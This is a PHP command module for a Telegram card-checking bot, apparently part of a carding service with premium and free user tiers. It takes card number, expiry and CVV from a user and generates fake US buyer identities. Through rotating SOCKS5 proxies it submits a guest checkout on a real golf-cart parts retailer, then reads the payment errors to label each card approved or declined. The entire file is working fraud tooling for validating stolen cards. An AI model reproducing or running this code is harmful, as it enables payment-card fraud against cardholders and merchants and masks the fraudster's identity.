<?php
list($cmd) = explode(" ", $message);
if($cmd == "/wf" or $cmd == ".wf" or $cmd == "!wf"){
$NameGater ='Wolf';
$gateway = '/wf :'.$NameGater;


is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Payflow Verising</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!sd card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Payflow Verising
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>
"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

$rotate = rotate();
$socks5 = socks5();


if(strlen($ano) == 2){
    $ano = "20".$ano;
}
    
if ($mes < 10) {
    $mes = substr($mes, -1);
}

$server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];


$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) .rand(00,2299). strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$phone = $user["phone"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];


$curl = new CurlX;
$cookie = uniqid();

if(strlen($ano) == 2 ){
  $ano = "20".$ano;
}


if ($mes < 10) {
    $mes = substr($mes, -1);
}



$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"])  . strtolower($user["name"]["last"]) .rand(111,2343). '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];

$zip = $user["location"]["postcode"];

$areaCode = rand(201, 999);
$centralOfficeCode = rand(100, 999);
$lineNumber = rand(1000, 9999);

$phone = $areaCode . $centralOfficeCode . $lineNumber;
$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];


$curl = new CurlX;


$maxRetries = 3; // número máximo de intentos
$retries = 0; // contador de intentos





while ($retries < $maxRetries) {
    try { 
        $cookie = uniqid();
        $server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

        
        $headers = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://ezgolfcart.com',
            'Referer: https://ezgolfcart.com/i-6859763-brake-drum-hub-assy-oem-e-z-go.html',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        ];
        $data = array(
            "product" => array(
                "number" => "6859763",
                "quantity" => "1"
            ),
            "action_cart_add" => "1"
        ); 
        $req2 = $curl::Post('https://ezgolfcart.com/cart.html', http_build_query($data), $headers, $cookie, $server);

        $headers = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://ezgolfcart.com',
            'Referer: https://ezgolfcart.com/cart.html',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"'
        ];
        $data = 'wsm_cart%5Btype%5D=cart&action=checkout.init&cart_target=order&wsm_cart%5Bitem%5D%5B6951811%5D%5Bselected%5D=1&wsm_cart%5Bitem%5D%5B6951811%5D%5Bquantity%5D=1';
        $req2 = $curl::Post('https://ezgolfcart.com/checkout-init.html', $data, $headers, $cookie, $server);
            
        $headers = [
            'Accept: */*',
            'Accept-Language: es-ES,es;q=0.9',
            'Connection: keep-alive',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Referer: https://ezgolfcart.com/checkout.html',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'X-Requested-With: XMLHttpRequest',
        ];
        $req2 = $curl::Get('https://ezgolfcart.com/api/order-check', $headers, $cookie, $server);

        $ordeid = $req2->headers->request["Cookie"];
        $wsm_order_egc = trim(strip_tags($curl::ParseString($ordeid, 'wsm_order_egc=', ';')));


        $headers = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://ezgolfcart.com',
            'Referer: https://ezgolfcart.com/checkout.html',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        ];
        $data = 'action=checkout.submit&form%5Baccount%5D=guest&form%5Bguest%5D%5Bemail%5D='.urlencode($email).'&form%5Bregister%5D%5Bemail%5D=&form%5Bregister%5D%5Bfirstname%5D=&form%5Bregister%5D%5Blastname%5D=&form%5Bregister%5D%5Bpassword1%5D=&form%5Bregister%5D%5Bpassword2%5D=&form%5Blogin%5D%5Bemail%5D=&form%5Blogin%5D%5Bpassword%5D=&form%5Bbilling%5D%5Bcompany%5D=Corp+'.$lastname.'&form%5Bbilling%5D%5Bfirstname%5D='.$firstname.'&form%5Bbilling%5D%5Blastname%5D='.$lastname.'&form%5Bbilling%5D%5Bcountry%5D=1&form%5Bbilling%5D%5Baddress%5D='.urlencode($street).'&form%5Bbilling%5D%5Baddress2%5D=&form%5Bbilling%5D%5Bcity%5D=Olympia&form%5Bbilling%5D%5Bstate%5D=67&form%5Bbilling%5D%5Bzip%5D=98501&form%5Bbilling%5D%5Bphone%5D='.$phone.'&form%5Bbilling%5D%5Bextension%5D=&form%5Bbilling%5D%5Bvalidated%5D=&form%5Bshipping%5D%5Bvalidated%5D=&form%5Bpayment_method%5D=credit&form%5Bcredit%5D%5Bnumber%5D='.$cc.'&form%5Bcredit%5D%5Bname%5D='.$firstname.'+'.$lastname.'&form%5Bcredit%5D%5Bexpire_month%5D='.$mes.'&form%5Bcredit%5D%5Bexpire_year%5D='.$ano.'&form%5Bcredit%5D%5Bcid%5D='.$cvv.'&form%5Bquestion%5D%5B101%5D=&form%5Bquestion%5D%5B102%5D=&form%5Bquestion%5D%5B103%5D=&wsm_cart%5Bitem%5D%5B12023086%5D%5Bselected%5D=1&form%5Bshipping_method%5D=6';
        $req2 = $curl::Post('https://ezgolfcart.com/checkout.html?order='.$wsm_order_egc.'', $data, $headers, $cookie, $server);
        break; 
    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
        $text = Textretries();
         bot('editMessageText', ['chat_id'=>$chatId, 'message_id'=>$messageidtoedit, 'text'=>$text, 'parse_mode'=>'html', 'reply_to_message_id'=> $message_id]);
         return;
        }
    }
}

$mgs = trim(strip_tags($curl::ParseString($req2->body , '<li class="wsm_error">Payment:', '/li>')));


$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Payflow Verising
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);


if(strpos($req2->body, "Card Security Code (CSC) Mismathc")){ 
$status = "APPROVED CCN ✅";
$response = "Card Security Code (CSC) Mismathc";
}elseif(strpos($req2->body, "Authorization error: 'CVV_FAILURE'")){ 
$status = "APPROVED CCN✅";
$response = "CVV_FAILURE";
}elseif(strpos($req2->body, "Authorization error: 'TRANSACTION_LIMIT', Authorization error: 'ADDRESS_VERIFICATION_FAILURE' ")){ 
$status = "APPROVED LACK_FUNDS✅";
$response = "TRANSACTION_LIMIT";
}else{
$status = "[ DECLINED 🔴 ]";
$response = trim($mgs);
}
   
   
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Payflow Verising
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


}

